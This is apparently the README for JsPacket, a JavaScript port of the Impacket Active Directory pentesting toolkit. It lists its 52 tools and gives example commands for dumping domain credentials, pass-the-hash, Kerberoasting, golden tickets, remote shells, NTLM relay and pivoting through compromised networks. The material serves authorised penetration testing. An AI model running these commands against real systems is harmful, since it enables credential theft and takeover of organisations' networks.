# JsPacket

![Stars](https://img.shields.io/github/stars/duty1g/jspacket)
![npm Version](https://img.shields.io/npm/v/jspacket)
![alt text](https://img.shields.io/github/languages/top/duty1g/jspacket)
![License](https://img.shields.io/badge/License-Apache%202.0-green)
![Red Team](https://img.shields.io/badge/Red-Team-red)
![Pentesting](https://img.shields.io/badge/Pentesting-blue)
<a href="https://twitter.com/duty_1g"><img src="https://img.shields.io/twitter/follow/duty_1g.svg?logo=twitter"></a>

<p align="center"><img src="jspacket.png" width="75%"/></p>
<h4 align="center">Impacket reimplemented in TypeScript and JavaScript.</h4>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#install">Install</a> •
  <a href="#usage">Usage</a> •
  <a href="#tools">Tools</a> •
  <a href="#proxy-support">Proxy</a> •
  <a href="#platform-support">Platforms</a> •
  <a href="#contributing">Contributing</a>
</p>

#

JsPacket is a lightweight, fast, and fully portable reimplementation of [Impacket](https://github.com/fortra/impacket) in TypeScript and JavaScript. No Python runtime, no native extensions — just `npm install` and go, or compile to a standalone binary. Ships as self-contained JavaScript bundles that run anywhere Node.js runs: Linux, macOS, Windows, WSL, Docker, and CI pipelines. Same tools, same flags, same output — if you know Impacket, you already know jspacket.

Built as a monorepo with 44 packages mirroring Impacket's module structure: SMB, DCE/RPC, Kerberos, LDAP, NTLM, DPAPI, WMI/DCOM, MSSQL, and more.

> **Beta Release** — under active development. If something isn't working, test the same operation with Impacket side-by-side and include both outputs in your [bug report](https://github.com/duty1g/jspacket/issues/new).


## Features

- **52 CLI Tools:** Every Impacket example script — secretsdump, psexec, wmiexec, kerberoasting, and more.
- **Lightweight:** Self-contained `.mjs` bundles, no Python, no C extensions, no native compilation.
- **Fast:** V8-powered with native async I/O; concurrent operations run without the GIL.
- **Portable:** Runs anywhere Node.js runs — Linux, macOS, Windows, WSL, Docker, CI pipelines.
- **Drop-in Familiar:** Same flags, same output format — switch from Impacket without relearning.
- **Native SOCKS5 Proxy:** Built-in `-proxy socks5://host:port` on all 52 tools for pivoting.
- **Proxychains Compatible:** Works out of the box with `proxychains4` via LD_PRELOAD.
- **Full Protocol Support:** SMB 1/2/3, DCE/RPC (20+ interfaces), Kerberos 5, LDAP, NTLM, DPAPI, WMI/DCOM, MSSQL TDS.
- **Multiple Auth Methods:** Password, NTLM hash (pass-the-hash), Kerberos ccache, AES keys.
- **44 Library Packages:** Modular `@impacket/*` packages mirroring Impacket's Python modules.
- **Zero Dependencies:** No native modules — pure JavaScript at runtime.
- **STDIN/STDOUT Integration:** Seamlessly integrate with other tools and workflows.


## Install

```console
npm install -g jspacket
```

Or run without installing:

```console
npx jspacket-secretsdump domain/user@target
```

**Requirements:** Node.js 18+ (LTS recommended). No Python, no build tools, no native modules.


## Running JsPacket

```console
$ jspacket-lookupsid 'CORP/pentest@dc01.corp.local' -hashes :aabbccddee1122334455667788990011

     ____.      __________                __           __
    |    | _____\______   \_____    ____ |  | __ _____/  |_
    |    |/  ___/|     ___/\__  \ _/ ___\|  |/ // __ \   __\
/\__|    |\___ \ |    |     / __ \\  \___|    <\  ___/|  |
\________/____  >|____|    (____  /\___  >__|_ \\___  >__|
              \/                \/     \/     \/    \/
                                                v0.1.0{#dev}@duty1g

[*] Brute forcing SIDs at dc01.corp.local
[*] StringBinding ncacn_np:dc01.corp.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-316352084-282881915-462937787
498: CORP\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CORP\Administrator (SidTypeUser)
501: CORP\Guest (SidTypeUser)
502: CORP\krbtgt (SidTypeUser)
512: CORP\Domain Admins (SidTypeGroup)
513: CORP\Domain Users (SidTypeGroup)
514: CORP\Domain Guests (SidTypeGroup)
515: CORP\Domain Computers (SidTypeGroup)
516: CORP\Domain Controllers (SidTypeGroup)
517: CORP\Cert Publishers (SidTypeAlias)
518: CORP\Schema Admins (SidTypeGroup)
519: CORP\Enterprise Admins (SidTypeGroup)
1001: CORP\svc.backup (SidTypeUser)
1002: CORP\svc.sql (SidTypeUser)
1003: CORP\j.smith (SidTypeUser)
1004: CORP\a.jones (SidTypeUser)
```


## Usage

Here are several examples to help you get started:

**Credential Dumping (secretsdump):**
```console
# Full domain dump (SAM + LSA + NTDS via DRSUAPI)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash

# Just NTDS (all domain hashes)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash -just-dc

# Single user
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :nthash -just-dc-user krbtgt
```

**Remote Execution:**
```console
# PSExec shell
jspacket-psexec 'DOMAIN/admin:password@target'

# WMI-based shell (stealthier)
jspacket-wmiexec 'DOMAIN/admin:password@target'

# DCOM-based shell
jspacket-dcomexec 'DOMAIN/admin:password@target'

# Task-based (AT scheduler)
jspacket-atexec 'DOMAIN/admin:password@target' 'whoami'
```

**Authentication Methods:**
```console
# Password
jspacket-secretsdump 'DOMAIN/admin:Password123@dc01.domain.local'

# NTLM hash (pass-the-hash)
jspacket-secretsdump 'DOMAIN/admin@dc01' -hashes :aabbccddee1122334455667788990011

# Kerberos (ccache ticket)
export KRB5CCNAME=admin.ccache
jspacket-secretsdump 'DOMAIN/admin@dc01' -k -no-pass

# AES key
jspacket-getTGT 'DOMAIN/admin@dc01' -aesKey <aes256-key>
```

**Kerberos Attacks:**
```console
# Kerberoasting
jspacket-GetUserSPNs 'DOMAIN/user:password@dc01' -request

# AS-REP roasting
jspacket-GetNPUsers 'DOMAIN/user:password@dc01' -request

# Request a TGT
jspacket-getTGT 'DOMAIN/user:password'

# Golden ticket
jspacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain DOMAIN admin
```

**AD Enumeration:**
```console
# Enumerate users
jspacket-GetADUsers 'DOMAIN/user:password@dc01' -all

# Enumerate computers
jspacket-GetADComputers 'DOMAIN/user:password@dc01' -all

# SID lookup
jspacket-lookupsid 'DOMAIN/user:password@dc01'

# Find delegation
jspacket-findDelegation 'DOMAIN/user:password@dc01'
```

**SMB Operations:**
```console
# Interactive SMB client
jspacket-smbclient 'DOMAIN/user:password@target'

# Remote service control
jspacket-services 'DOMAIN/admin:password@target' list

# Remote registry
jspacket-reg 'DOMAIN/admin:password@target' query -keyName HKLM\\SYSTEM\\CurrentControlSet
```

**Pivoting Through a Proxy:**
```console
# Native -proxy flag
jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash -proxy socks5://127.0.0.1:1080

# Via proxychains
proxychains4 jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash
```


## Proxy Support

All 52 tools support SOCKS5 proxying for pivoting through compromised networks:

```console
# Native -proxy flag (recommended)
jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash -proxy socks5://127.0.0.1:1080

# With proxy authentication
jspacket-wmiexec 'DOMAIN/admin@dc' -proxy socks5://user:pass@proxy:1080

# Via environment variable
export JSPACKET_PROXY=socks5://127.0.0.1:1080
jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash

# Via proxychains (LD_PRELOAD — works out of the box)
proxychains4 jspacket-secretsdump 'DOMAIN/admin@dc' -hashes :nthash
```

All connection types are routed through the proxy: SMB, DCE/RPC, LDAP, Kerberos.


## Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| Linux (x64/arm64) | Fully supported | Primary development platform |
| WSL / WSL2 | Fully supported | Tested extensively |
| macOS (Intel/Apple Silicon) | Fully supported | No native deps to compile |
| Windows (native) | Fully supported | Via `node`/`npx`, PowerShell or CMD |
| Docker | Fully supported | `node:18-alpine` or any Node image |
| CI/CD (GitHub Actions, etc.) | Fully supported | Single `npm install -g jspacket` step |


## Tools

All 52 Impacket example scripts, ported and tested against live Active Directory.

### Remote execution
| Tool | Description |
|------|-------------|
| `jspacket-psexec` | PSExec-style remote shell via SMB/SCMR |
| `jspacket-wmiexec` | Semi-interactive shell via WMI |
| `jspacket-smbexec` | Stealthy shell via SMB service creation |
| `jspacket-dcomexec` | Shell via DCOM (MMC20/ShellWindows/ShellBrowserWindow) |
| `jspacket-atexec` | Task-based execution via ATSVC |

### Credential extraction
| Tool | Description |
|------|-------------|
| `jspacket-secretsdump` | Domain/local credential dump (DRSUAPI, SAM, LSA, cached) |
| `jspacket-dpapi` | DPAPI backup key retrieval, masterkey/credential/vault decrypt |
| `jspacket-samedit` | In-place SAM hive password editing |

### Kerberos
| Tool | Description |
|------|-------------|
| `jspacket-getTGT` | Request a TGT with password, hash, or aesKey |
| `jspacket-getST` | Request a service ticket (S4U2self/S4U2proxy/U2U) |
| `jspacket-GetUserSPNs` | Kerberoasting — request TGS for SPNs |
| `jspacket-GetNPUsers` | AS-REP roasting — find users without pre-auth |
| `jspacket-ticketer` | Golden/silver ticket creation |
| `jspacket-describeTicket` | Parse and display ccache/kirbi tickets |
| `jspacket-ticketConverter` | Convert between ccache and kirbi formats |
| `jspacket-getPac` | Retrieve a user's PAC via S4U2self |
| `jspacket-keylistattack` | RODC key-list attack |
| `jspacket-raiseChild` | Child-to-parent domain escalation |

### AD enumeration & attacks
| Tool | Description |
|------|-------------|
| `jspacket-GetADUsers` | Enumerate domain users via LDAP |
| `jspacket-GetADComputers` | Enumerate domain computers via LDAP |
| `jspacket-findDelegation` | Find delegation relationships |
| `jspacket-lookupsid` | SID brute-force enumeration |
| `jspacket-samrdump` | User enumeration via SAMR |
| `jspacket-addcomputer` | Add a machine account (SAMR/LDAPS) |
| `jspacket-changepasswd` | Change/reset password (SAMR/Kpasswd/LDAP) |
| `jspacket-rbcd` | RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) |
| `jspacket-dacledit` | DACL/ACE editing on AD objects |
| `jspacket-owneredit` | Read/write object owner SID |
| `jspacket-badsuccessor` | dMSA BadSuccessor abuse |

### DCE/RPC & host operations
| Tool | Description |
|------|-------------|
| `jspacket-rpcdump` | RPC endpoint mapper dump |
| `jspacket-rpcmap` | RPC interface/UUID bruteforce scanning |
| `jspacket-services` | Remote service control via SCMR |
| `jspacket-reg` | Remote registry read/write/save via RRP |
| `jspacket-wmiquery` | WQL queries over WMI |
| `jspacket-wmipersist` | WMI event subscription persistence |
| `jspacket-machine-role` | Detect DC/workstation role |
| `jspacket-getArch` | Remote architecture detection via RPC |
| `jspacket-tstool` | Terminal Services session operations |
| `jspacket-net` | net-command enumeration via SAMR |

### SMB & file operations
| Tool | Description |
|------|-------------|
| `jspacket-smbclient` | Interactive SMB client |
| `jspacket-smbserver` | Standalone SMB server |
| `jspacket-karmaSMB` | Rogue SMB server (per-extension payload delivery) |
| `jspacket-attrib` | Remote file attribute query/set |
| `jspacket-ntlmrelayx` | NTLM relay engine (SMB+HTTP) |

### SQL & other protocols
| Tool | Description |
|------|-------------|
| `jspacket-mssqlclient` | Interactive SQL Server client |
| `jspacket-mssqlinstance` | SQL Server instance enumeration via Browser |
| `jspacket-exchanger` | Exchange NSPI attacks over RPC/HTTP v2 |
| `jspacket-mqtt-check` | MQTT login check |

### Offline tools
| Tool | Description |
|------|-------------|
| `jspacket-registry-read` | Offline registry hive parsing |
| `jspacket-esentutl` | ESE/JET database tool |
| `jspacket-ntfs-read` | Raw NTFS volume reading |
| `jspacket-filetime` | Windows FILETIME converter |


## Development

```console
# Clone and install
git clone https://github.com/duty1g/jspacket
cd jspacket
pnpm install

# Build all packages
pnpm build

# Run a tool in dev mode (no build needed)
npx tsx tools/src/secretsdump.ts domain/user@target

# Run tests
pnpm test

# Type check
pnpm typecheck

# Build publishable CLI package
cd tools && node build.mjs
```


## Contributing

Contributions are welcome. jspacket is a large codebase — here's how to get started:

1. **Pick a tool** — check the [issues](https://github.com/duty1g/jspacket/issues) for bugs or missing features
2. **Test against Impacket** — run the same command with both tools and compare output
3. **Submit a PR** — keep changes focused; one tool/package per PR when possible

- Match Impacket's output format and flag names so users can switch seamlessly
- Use the existing `@impacket/*` packages rather than adding new dependencies
- Every tool should be testable with `npx tsx tools/src/<tool>.ts` in dev mode
- Include the Impacket command you tested against in your PR description


## Reporting Issues

Found a bug? Please [open an issue](https://github.com/duty1g/jspacket/issues/new) with:

1. **The jspacket command** you ran (redact credentials)
2. **The equivalent Impacket command** and its output
3. **The jspacket output** (full error/traceback)
4. **Your environment** — OS, Node.js version (`node -v`), jspacket version

Side-by-side comparison with Impacket is the fastest way to triage — it tells us immediately whether the issue is in our protocol implementation or something upstream.

---

### Credits

- [Impacket](https://github.com/fortra/impacket) by Fortra (Alberto Solino / @agsolino) — the original Python implementation that jspacket ports from
- [GoPacket](https://github.com/duty1g/gopacket) — Go port of Impacket, used as a secondary reference for protocol edge cases

---

### License

Modified Apache License, inherited from Impacket. See [LICENSE](./LICENSE).

Made with by [@duty1g](https://github.com/duty1g)
